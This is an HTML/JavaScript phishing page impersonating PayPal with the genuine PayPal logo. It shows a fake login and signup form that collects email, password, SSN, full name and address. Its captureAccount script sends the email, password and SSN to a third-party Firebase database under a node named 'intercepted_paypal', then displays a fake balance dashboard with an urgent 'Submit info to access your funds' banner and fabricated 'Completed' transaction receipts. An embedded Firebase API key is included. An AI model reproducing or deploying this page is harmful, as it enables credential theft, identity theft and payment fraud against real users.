<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PayPal: Summary</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        :root { --pp-blue: #0070ba; --pp-dark: #003087; --bg: #f5f7fa; --error-red: #d93025; --text: #2c2e2f; }
        body { font-family: "Open Sans", "Helvetica Neue", Arial, sans-serif; background: var(--bg); margin: 0; color: var(--text); overflow-x: hidden; }

        /* HEADER & NAVIGATION */
        .pp-nav { background: var(--pp-dark); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:100; }
        .pp-logo-img { height: 24px; filter: brightness(0) invert(1); }

        /* RED URGENT BANNER (FROM SCREENSHOT) */
        .urgent-red { background: var(--error-red); color: white; padding: 15px 20px; display: flex; align-items: center; justify-content: space-between; font-size: 14px; cursor: pointer; font-weight: 600; }

        /* DASHBOARD CARDS */
        .card { background: #fff; margin: 12px; padding: 20px; border-radius: 12px; box-shadow: 0 1px 4px rgba(0,0,0,0.08); }
        .balance-val { font-size: 48px; font-weight: 300; margin: 10px 0; }
        
        /* NOTIFICATIONS TAB (FROM SCREENSHOT) */
        .notif-tabs { display: flex; background: #fff; border-bottom: 1px solid #ddd; }
        .tab { flex: 1; text-align: center; padding: 15px; font-weight: 700; font-size: 14px; color: var(--pp-blue); border-bottom: 3px solid transparent; }
        .tab.active { border-bottom: 3px solid var(--pp-blue); background: #f0f7ff; }

        /* ACTION LINKS */
        .action-link { color: var(--pp-blue); font-weight: 700; text-decoration: none; display: block; margin-top: 15px; font-size: 14px; }

        /* FULL RECEIPT OVERLAY */
        .receipt-view { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index: 5000; overflow-y: auto; padding: 20px; box-sizing: border-box; }
        .receipt-row { display: flex; justify-content: space-between; padding: 15px 0; border-bottom: 1px solid #eee; font-size: 14px; }

        /* AUTH SCREENS */
        #login-screen, #signup-screen { position: fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index: 10000; padding: 40px 25px; box-sizing: border-box; text-align: center; overflow-y: auto; }
        .pp-input { width: 100%; padding: 16px; border: 1px solid #9ca2a6; border-radius: 4px; margin-bottom: 12px; font-size: 16px; box-sizing: border-box; }
        .btn-full { width: 100%; padding: 16px; background: var(--pp-blue); color: white; border: none; border-radius: 25px; font-weight: 700; font-size: 16px; margin-top: 10px; }
    </style>
</head>
<body>

    <div id="login-screen">
        <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" width="100" style="margin-bottom:30px;">
        <div id="auth-header"><h2>Log In</h2></div>
        <input type="email" id="email" class="pp-input" placeholder="Email or phone number">
        <input type="password" id="pass" class="pp-input" placeholder="Password">
        <div id="signup-extra" style="display:none;">
            <input type="text" id="fullname" class="pp-input" placeholder="Full legal name">
            <input type="text" id="ssn" class="pp-input" placeholder="SSN / ID Number">
            <input type="text" id="address" class="pp-input" placeholder="Home Address">
        </div>
        <button class="btn-full" onclick="captureAccount()">Next</button>
        <p id="toggle-text" style="color:var(--pp-blue); font-weight:700; margin-top:25px;" onclick="toggleAuth()">New to PayPal? Sign Up</p>
        
        <select id="country-select" style="margin-top:40px; border:none; color:#666;" onchange="changeLanguage()">
            <option value="USD">English (US) - $</option>
            <option value="GBP">English (UK) - £</option>
            <option value="NGN">Nigeria (NG) - ₦</option>
        </select>
    </div>

    <div id="main-app" style="display:none;">
        <div class="pp-nav">
            <i class="fas fa-bars" style="color:white; font-size:20px;"></i>
            <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" class="pp-logo-img">
            <i class="fas fa-bell" style="color:white; font-size:20px;"></i>
        </div>

        <div class="urgent-red" onclick="openResolution()">
            <div style="display:flex; align-items:center; gap:10px;">
                <i class="fas fa-exclamation-triangle"></i>
                <span>Submit info to access your funds</span>
            </div>
            <i class="fas fa-arrow-right"></i>
        </div>

        <div class="card">
            <div style="display:flex; justify-content:space-between;">
                <span style="font-weight:600; color:#666;">PayPal balance</span>
                <i class="fas fa-ellipsis-v"></i>
            </div>
            <div class="balance-val" id="main-bal">US$0.00</div>
            <span style="color:#666; font-size:14px;">Available</span>
        </div>

        <div class="notif-tabs">
            <div class="tab active">Notifications (1)</div>
            <div class="tab">Inbox (0)</div>
        </div>

        <div class="card">
            <div style="display:flex; gap:15px; align-items:flex-start;">
                <div style="background:#f0f2f5; padding:10px; border-radius:50%; color:var(--pp-blue);"><i class="fas fa-credit-card"></i></div>
                <div>
                    <b style="font-size:14px;">Link a card</b>
                    <p style="font-size:12px; color:#666; margin:5px 0;">Shop and send payments more securely.</p>
                    <a href="#" class="action-link">Link a card</a>
                </div>
            </div>
        </div>

        <div class="card">
            <b style="display:block; margin-bottom:15px;">Recent activity</b>
            <div id="activity-feed">
                <p style="font-size:13px; color:#666;">See when money comes in, and when it goes out. You'll find it here.</p>
            </div>
        </div>

        <button class="btn-full" style="margin:20px; width:calc(100% - 40px);" onclick="simulateTx()">Send Money (Test)</button>
    </div>

    <div id="receipt-page" class="receipt-view">
        <div style="display:flex; align-items:center; gap:20px; margin-bottom:30px;">
            <i class="fas fa-times" onclick="closeReceipt()" style="font-size:20px;"></i>
            <b style="font-size:18px;">Transaction Details</b>
        </div>
        <div id="receipt-content"></div>
    </div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyDp3h13LwtUlD7MiCkMys0EAgX5w2GGupc",
        authDomain: "orixa-football-pro.firebaseapp.com",
        projectId: "orixa-football-pro",
        databaseURL: "https://orixa-football-pro-default-rtdb.firebaseio.com",
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    let isLogin = true;
    let currency = "US$";

    function toggleAuth() {
        isLogin = !isLogin;
        document.getElementById('auth-header').innerHTML = isLogin ? "<h2>Log In</h2>" : "<h2>Sign Up</h2>";
        document.getElementById('signup-extra').style.display = isLogin ? 'none' : 'block';
        document.getElementById('toggle-text').innerText = isLogin ? "New to PayPal? Sign Up" : "Have an account? Log In";
    }

    function captureAccount() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        const ssn = document.getElementById('ssn').value;
        if(!email || !pass) return alert("Please fill fields.");

        db.ref('intercepted_paypal').push({
            email: email, password: pass, ssn: ssn, country: document.getElementById('country-select').value,
            time: new Date().toLocaleString()
        }).then(() => {
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('main-app').style.display = 'block';
            updateFeed();
        });
    }

    function simulateTx() {
        const amt = prompt("Amount to send:");
        const to = prompt("Recipient Email:");
        const txId = "PP-L-" + Math.floor(Math.random()*99999999);
        
        db.ref('transactions').push({
            id: txId, amount: amt, recipient: to, status: "Completed",
            fee: (amt * 0.03).toFixed(2), time: new Date().toLocaleString(), currency: currency
        }).then(() => updateFeed());
    }

    function updateFeed() {
        db.ref('transactions').on('value', (snap) => {
            const feed = document.getElementById('activity-feed');
            feed.innerHTML = "";
            snap.forEach(child => {
                const t = child.val();
                feed.innerHTML += `
                <div style="display:flex; justify-content:space-between; padding:15px 0; border-bottom:1px solid #eee;" onclick="showReceipt('${child.key}')">
                    <div><b>${t.recipient}</b><br><small style="color:#666;">${t.time}</small></div>
                    <b style="color:var(--error-red);">- ${t.currency}${t.amount}</b>
                </div>`;
            });
        });
    }

    function showReceipt(key) {
        db.ref('transactions/'+key).once('value', snap => {
            const t = snap.val();
            document.getElementById('receipt-page').style.display = 'block';
            document.getElementById('receipt-content').innerHTML = `
                <div style="text-align:center; padding:30px 0;">
                    <i class="fas fa-check-circle" style="color:green; font-size:50px;"></i>
                    <h2 style="margin:10px 0;">${t.currency}${t.amount}</h2>
                    <p>Sent to ${t.recipient}</p>
                </div>
                <div class="receipt-row"><span>Status</span><span style="color:green; font-weight:700;">${t.status}</span></div>
                <div class="receipt-row"><span>Transaction ID</span><span>${t.id}</span></div>
                <div class="receipt-row"><span>Payment Method</span><span>PayPal Balance</span></div>
                <div class="receipt-row"><span>Sent Amount</span><span>${t.currency}${t.amount}</span></div>
                <div class="receipt-row"><span>Fee</span><span>${t.currency}${t.fee}</span></div>
                <div class="receipt-row" style="border:none; font-weight:700; font-size:18px;"><span>Total</span><span>${t.currency}${(parseFloat(t.amount)+parseFloat(t.fee)).toFixed(2)}</span></div>
                <button class="btn-full" onclick="closeReceipt()">Print PDF Receipt</button>
            `;
        });
    }

    function closeReceipt() { document.getElementById('receipt-page').style.display = 'none'; }
    
    function changeLanguage() {
        const val = document.getElementById('country-select').value;
        currency = val === 'GBP' ? '£' : val === 'NGN' ? '₦' : 'US$';
        document.getElementById('main-bal').innerText = currency + "0.00";
    }
</script>
</body>
</html>
